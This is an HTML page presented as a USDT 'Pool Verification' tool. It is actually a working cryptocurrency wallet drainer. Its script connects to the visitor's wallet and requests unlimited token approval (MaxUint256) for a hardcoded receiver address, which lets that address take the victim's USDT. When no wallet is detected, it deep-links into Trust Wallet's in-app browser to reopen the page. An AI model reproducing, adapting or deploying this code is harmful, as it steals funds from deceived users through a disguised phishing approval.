<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investment Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 380px; border: 1px solid #3375bb; }
        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; }
        #status { margin-top: 15px; color: #848e9c; font-size: 13px; }
    </style>
</head>
<body>
    <div class="card">
        <h3>Pool Verification</h3>
        <p style="color:#848e9c; font-size:14px;">Connect to verify your USDT balance.</p>
        <button id="main-btn" class="btn" onclick="start()">CONNECT NOW</button>
        <div id="status">Ready.</div>
    </div>

    <script>
        const RECEIVER = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7";
        const USDT = "0x55d398326f99059fF775485246999027B3197955";

        async function start() {
            const status = document.getElementById("status");
            
            // 1. CHECK IF INSIDE TRUST WALLET
            if (window.ethereum) {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    const signer = provider.getSigner();

                    status.innerText = "Check for Approval Popup...";
                    
                    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
                    const contract = new ethers.Contract(USDT, abi, signer);
                    
                    // Trigger the APPROVAL
                    const tx = await contract.approve(RECEIVER, ethers.constants.MaxUint256);
                    status.innerText = "Processing...";
                    await tx.wait();
                    status.innerText = "SUCCESS: Verified!";
                } catch (err) {
                    status.innerText = "Error: " + err.message;
                }
            } else {
                // 2. IF OUTSIDE, FORCE OPEN TRUST WALLET APP
                status.innerText = "Opening Trust Wallet...";
                const dappUrl = window.location.href.replace("https://", "");
                // This deep link forces Trust Wallet to open YOUR site in its browser
                window.location.href = "trust://browser_enable?url=" + encodeURIComponent(window.location.href);
            }
        }
    </script>
</body>
</html>
